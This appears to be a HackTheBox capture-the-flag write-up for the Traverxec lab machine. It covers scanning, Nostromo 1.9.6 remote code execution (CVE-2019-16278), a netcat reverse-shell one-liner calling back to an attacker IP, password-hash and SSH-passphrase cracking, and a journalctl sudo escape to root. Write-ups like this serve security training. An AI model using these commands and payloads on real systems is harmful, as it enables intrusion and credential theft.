# <center>Traverxec  - HackTheBox WriteUp</center>
![info_card](/images/traverxec/info_card.png)
## Enumeration & Information Gathering 

#### Scanning
>Nmap done: 1 IP address (0 hosts up) scanned in 2.14 seconds
root@kali:/var/www/html/pub# nmap -T4 10.10.10.165
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-11 10:39 EDT
Nmap scan report for 10.10.10.165
Host is up (0.054s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.13 seconds
#### Service Enumeration

Home page:
![home_page](/images/traverxec/home_page.png)

By visiting pages on the site such as robots.txt, the veriosn of the HTTP App is revealed

![version](/images/traverxec/version.png)

Exploit search: nostromo 1.9.6 githhib
## Exploitation
https://github.com/rptucker/CVE-2019-16278-Nostromo_1.9.6-RCE/blob/master/CVE-2019-16278.py

Let's try a executing a command:

```
python nostromo.py -t '10.10.10.165' -p 80 -c 'whoami'
```

Now on to Reverse Shell

#### Foothold

Set up a listener:
```
nc -lnvp 1234
```

Grab netcat reverse shell payload from Pentest Monkey a use as payload:

```
python nostromo.py -t '10.10.10.165' -p 80 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.21 1234 >/tmp/f'
```

![foothold](/images/traverxec/foothold.png)

#### Post Exploitation Enumeration

Enumerating the file system of Nostromo

![post enum](/images/traverxec/post enum.png)

>www-data@traverxec:/var/nostromo/conf$ cat .htpasswd
> david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/

Cracking the passowrd using hashcat

```
hashcat64.exe -m 500 $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ c:\Users\admin\Downloads\rockyou.txt --force
```

![cracked](/images/traverxec/cracked.png)
david:Nowonly4me

Tried loging in via SSH with David User credentials but the password is not accepted.
checking SSHD config we see that password authentication is not allowed.We therefore need to find a private key. 

![sshd_config](/images/traverxec/sshd_config.png)

After much enumeration we go back to the nhttpd.conf file and remember that home dir is set to **/home** and **public_www**. The **serveradmin** is also set as **david@traverxec.htb** therefore we can probably navigate to david's home directory.

Turns out that we can, but we can't access files such as .bashrc or .ssh folder

![david_home](/images/traverxec/david_home.png)

We try navigating to the public_www folder on the shell and we are successful

![public_www](/images/traverxec/public_www.png)

We grab the gz file, extract it and ssh with the private key.

![ssh_gz](/images/traverxec/ssh_gz.png)

But we are blocked by a passphrase and the initial password **Nowonly4me** doesn't work here 

Cracking SSH passphrase with John
![crack_ssh](/images/traverxec/crack_ssh.png)


## Privilege Escalation

SSH using David's credentials we are able to Login.
Enumerating the home directory we find a shell script that runs a journalctl with sudo. 
![server_status](/images/traverxec/server_status.png)

running the command as is in the script works okay

This probably helps us realize that we have sudo NOPASSWORD set for running that command, we couldn't see that  using sudo -l becase we still don't know the user pass for David.

Next we visit GTFOBin https://gtfobins.github.io/gtfobins/journalctl/

We see we can break out of the binary much like the less/nano way
To do this we can either make our terminal window very small to force break output of journalctl OR we can just resize our terminal using `stty rows [number]`

Run the command and enter !/bin/sh

![root](/images/traverxec/root.png)

**Extra:** 

Top References:
1.    https://github.com/rptucker/CVE-2019-16278-Nostromo_1.9.6-RCE/blob/master/CVE-2019-16278.py

2.    https://gtfobins.github.io/gtfobins/journalctl/
